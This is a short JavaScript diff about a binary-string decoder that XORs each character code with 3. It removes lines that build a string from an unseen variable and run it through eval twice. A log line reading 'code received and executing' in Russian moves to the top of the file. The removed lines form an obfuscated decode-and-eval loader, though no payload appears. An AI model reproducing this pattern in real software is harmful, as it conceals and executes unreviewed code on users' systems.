@@ -1,3 +1,4 @@
+console.log("код получен и выполняется вар");
 function decodeBinary(c) {
     return String.fromCharCode(parseInt(c, 2) ^ 3);
 }
@@ -9,10 +10,5 @@ function executeCode(code) {
     return code.split(' ').map(mapFunction).join('');
 }
 
-var ras = `.split(' ').map(mapFunction).join('');`;
 
-js = js.replace(/^(.*)$/g, '"$1"');
-var fire = js + ras;
-var decodedCode = eval(fire);
-eval(decodedCode);
-console.log("код получен и выполняется вар");
+
